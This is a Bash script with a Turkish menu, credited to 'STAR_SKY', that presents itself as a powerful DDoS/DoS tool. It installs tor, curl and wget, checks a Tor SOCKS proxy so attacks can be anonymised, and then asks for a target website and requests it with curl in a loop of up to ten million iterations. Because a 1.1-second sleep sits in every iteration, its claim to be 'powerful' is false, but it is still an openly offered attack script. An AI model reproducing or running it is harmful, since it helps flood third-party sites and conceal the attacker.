#! bin/bash
# TERMİNAL İÇİN GÜÇLÜ DDOS && DOS YAZILIMI
clear
echo -e '\e[36m
 
░█▀█░█▀█░█▀█░░░█▄█░█▀▀░█▀█░█░█\e[37m
░█▀█░█░█░█▀█░░░█░█░█▀▀░█░█░█░█
░▀░▀░▀░▀░▀░▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀
'
sleep 1.1
echo -e '\e[37mCODED BY STAR_SKY'
sleep 1.1
echo
echo -e '\e[31m[\e[37m00\e[31m]\e[37mTOR SERVİSİ KULLAN \e[34m[\e[37mGÜÇLÜ SALDIRI İÇİN GEREKLİ\e[34m]'
sleep 0.5
echo -e '\e[31m[\e[37m01\e[31m]\e[37mTERMUX İÇİN GEREKSİNİMLER'
sleep 0.5
echo -e '\e[31m[\e[37m02\e[31m]\e[37mLİNUX İÇİN GEREKSİNİMLER'
sleep 0.5
echo -e '\e[31m[\e[37m03\e[31m]\e[37mPOWER-DDOS'
sleep 0.5
echo
echo -e '\e[31m[\e[37m99\e[31m]\e[37mÇIKIŞ'
sleep 1.1
echo
read -p $'\e[35mSEÇİM YAPINIZ=}\e[37m' secim

if [[ $secim == 00 ]]; then
echo -e '\e[31mYENİ Bİ KOMUT SATIRI AÇIP \e[37mtor \e[31mKELİMESİNİ YAZINIZ...'
sleep 9.2
echo -e '\e[31mLÜTFEN TOR SERVİSİNİ AKTİF ETTİĞİNİZDEN EMİN OLUNUZ VE SALDIRIYI BAŞLATINIZ...'
sleep 3
curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?


elif [[ $secim == 01 || $secim == 1 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...'
pkg install git -y
pkg install tor -y
pkg install wget -y
pkg install curl -y
echo -e '\e[31mKURULUM BİTTİ...'
sleep 1.1
bash powerddos.sh

elif [[ $secim == 02 || $secim == 2 ]]; then
clear
echo -e '\e[31mKURULUM BAŞLADI...'
echo -e '\e[37m'
sudo apt-get install git -y
sudo apt-get install tor -y
sudo apt-get install curl -y
sudo apt-get install wget -y
echo -e '\e[31mKURULUM BİTTİ...'
sleep 1.1
bash powerddos.sh

elif [[ $secim == 03 || $secim == 3 ]]; then

clear
echo -e '\e[31m
░█▀█░█▀█░█░█░█▀▀░█▀▄░█▀▄░█▀▄░█▀█░█▀▀\e[37m
░█▀▀░█░█░█▄█░█▀▀░█▀▄░█░█░█░█░█░█░▀▀█
░▀░░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀░░▀▀▀░▀▀▀
'
sleep 1.1
echo -e '\e[34mSTAR_SKY'
echo			      
echo -e 'CODED BY STAR_SKY'
echo 
read -p $'\e[36mHEDEF SİTEYİ YAZINIZ (ÖRN=https://www.google.com) =}\e[37m' hedefweb

web=0

while [ $web -lt 10000000 ]; do
	echo -e '\e[31m'
	echo -e PAKET GÖNDERİLDİ = $web
	sleep 1.1
	let web=web+1
	clear	
	curl $hedefweb
done

elif [[ $secim == 99 ]]; then
clear
echo -e '\e[31mSTAR_SKY OLARAK İYİ GÜNLER DİLERİM...'
sleep 1.1
exit


else
	clear
	echo -e '\e[31mHATALI GİRİŞ!'
	sleep 1.1
	bash powerddos.sh
fi
